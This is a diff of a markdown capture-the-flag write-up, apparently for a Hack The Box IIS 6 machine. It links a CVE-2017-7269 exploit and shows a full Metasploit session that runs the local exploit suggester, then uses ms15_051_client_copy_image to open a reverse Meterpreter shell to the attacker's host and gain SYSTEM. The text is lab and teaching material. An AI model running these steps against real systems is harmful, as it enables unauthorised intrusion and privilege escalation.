@@ -98,7 +98,7 @@ Too bad it doesn't
 
 Anyways looking at the IIS version it looks very old 
 
-Searching for exploit leads to this https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+Searching for exploit leads to this [Exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
 
 ```
                                                                                                                                                                                                                    
@@ -165,4 +165,89 @@ dir
                7 Dir(s)   1,318,838,272 bytes free
 
 ```
+
+Now i'll get a more shell to metasploit so i can check for vulnerabilities
+
+If you have been reading my other writeups you will now the process already 
+
+As am not going to say it here
+
+After using the exploit suggester from msf here's the result
+
+```
+meterpreter > background                                                                                                                                                                                          
+[*] Backgrounding session 1...                                                                                                                                                                                    
+msf6 post(multi/recon/local_exploit_suggester) > options                                                                                                                                                          
+                                                                                                                                                                                                                  
+Module options (post/multi/recon/local_exploit_suggester):                                                                                                                                                        
+                                                                                                                                                                                                                  
+   Name             Current Setting  Required  Description                                                                                                                                                        
+   ----             ---------------  --------  -----------                                                                                                                                                        
+   SESSION          1                yes       The session to run this module on                                                                                                                                  
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits                                                                                                         
+                                                                                                                                                                                                                  
+msf6 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                              
+                                                                                                                                                                                                                  
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...                                                                                                                                                    
+[*] 10.10.10.14 - 167 exploit checks are being tried...                                                                                                                                                           
+[-] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image                                                                                                                                                         
+[*] Post module execution completed      
+```
+
+Now i'll use the exploit msf gave
+
+```
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image                                                                                                             
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms15_051_client_copy_image) > options
+Module options (exploit/windows/local/ms15_051_client_copy_image):                                                                                                                                                
+   Name     Current Setting  Required  Description                                                                                                                                                                
+   ----     ---------------  --------  -----------                                                                                                                                                                
+   SESSION                   yes       The session to run this module on                                                                                                                                          
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description                                                                                                                                                               
+   ----      ---------------  --------  -----------                                                                                                                                                               
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                                                 
+   LHOST     192.168.220.131  yes       The listen address (an interface may be specified)                                                                                                                        
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name                                                                                                                                                                                                       
+   --  ----                                                                                                                                                                                                       
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
+session => 1
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set lhost tun0
+lhost => tun0
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+
+[*] Started reverse TCP handler on 10.10.16.7:4444 
+[*] Reflectively injecting the exploit DLL and executing it...
+[*] Launching netsh to host the DLL...
+[+] Process 3440 launched.
+[*] Reflectively injecting the DLL into 3440...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175686 bytes) to 10.10.10.14
+[*] Meterpreter session 2 opened (10.10.16.7:4444 -> 10.10.10.14:1043) at 2023-01-25 14:21:57 +0100
+
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+```
+
+And we're done
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
+
+
 
